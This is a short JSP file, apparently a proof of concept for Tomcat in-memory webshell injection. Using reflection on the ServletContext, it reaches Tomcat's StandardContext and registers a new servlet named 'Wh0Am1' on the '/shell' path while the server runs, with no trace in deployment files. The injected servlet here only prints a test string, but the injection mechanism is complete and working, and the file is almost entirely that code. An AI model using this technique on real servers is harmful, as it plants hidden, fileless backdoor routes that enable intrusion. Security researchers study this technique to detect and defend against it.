<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %><%--
  Created by IntelliJ IDEA.
  User: Luc
  Date: 2022/12/19
  Time: 16:25
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
  ServletContext servletContext = request.getSession().getServletContext();

  Field appctx = servletContext.getClass().getDeclaredField("context");
  appctx.setAccessible(true);
  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

  Field standContext = applicationContext.getClass().getDeclaredField("context");
  standContext.setAccessible(true);
  StandardContext standardContext = (StandardContext) standContext.get(applicationContext);

  Servlet servlet = new HttpServlet() {
      @Override
      protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
          resp.getWriter().write("Inject test Page");
      }
  };

  Wrapper newWrapper = standardContext.createWrapper();
  newWrapper.setName("Wh0Am1");
  newWrapper.setLoadOnStartup(1);
  newWrapper.setServlet(servlet);
  newWrapper.setServletClass(servlet.getClass().getName());

  standardContext.addChild(newWrapper);
  standardContext.addServletMapping("/shell","Wh0Am1");
%>
<html>
<head>
    <title>Title</title>
</head>
<body>

</body>
</html>
